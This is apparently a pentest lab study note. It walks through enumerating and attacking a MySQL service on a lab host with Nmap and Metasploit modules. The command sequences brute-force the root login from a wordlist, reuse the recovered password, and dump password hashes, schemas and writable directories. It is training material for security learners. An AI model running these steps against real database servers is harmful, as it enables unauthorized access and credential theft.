# MySQL Enumeration

[Home](../README.md) · [Section index](README.md)

> Adapted from the original notes, lines 1088–1161. Examples are lab-specific and need verification.

In this lab environment, you will be provided with GUI access to a Kali machine. The target machine running a MySQL service will be accessible at **demo.ine.local**.

**Objective:** Your task is to run the following auxiliary modules against the target:

- auxiliary/scanner/mysql/mysql_version
- auxiliary/scanner/mysql/mysql_login
- auxiliary/admin/mysql/mysql_enum
- auxiliary/admin/mysql/mysql_sql
- auxiliary/scanner/mysql/mysql_file_enum
- auxiliary/scanner/mysql/mysql_hashdump
- auxiliary/scanner/mysql/mysql_schemadump
- auxiliary/scanner/mysql/mysql_writable_dirs

Tools: Nmap , Metasploit Framework

```bash
ping -c 4 demo.ine.local
nmap demo.ine.local

msfconsole -q
use auxiliary/scanner/mysql/mysql_version
set RHOSTS demo.ine.local
run

use auxiliary/scanner/mysql/mysql_login
set RHOSTS demo.ine.local
set USERNAME root
set PASS_FILE /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt
set VERBOSE false
run

use auxiliary/admin/mysql/mysql_enum
set USERNAME root
set PASSWORD twinkle
set RHOSTS demo.ine.local
run

use auxiliary/admin/mysql/mysql_sql
set USERNAME root
set PASSWORD twinkle
set RHOSTS demo.ine.local
run

use auxiliary/scanner/mysql/mysql_file_enum
set USERNAME root
set PASSWORD twinkle
set RHOSTS demo.ine.local
set FILE_LIST /usr/share/metasploit-framework/data/wordlists/directory.txt
set VERBOSE true
run

use auxiliary/scanner/mysql/mysql_hashdump
set USERNAME root
set PASSWORD twinkle
set RHOSTS demo.ine.local
run

use auxiliary/scanner/mysql/mysql_schemadump
set USERNAME root
set PASSWORD twinkle
set RHOSTS demo.ine.local
run

use auxiliary/scanner/mysql/mysql_writable_dirs
set RHOSTS demo.ine.local
set USERNAME root
set PASSWORD twinkle
set DIR_LIST /usr/share/metasploit-framework/data/wordlists/directory.txt
run

```
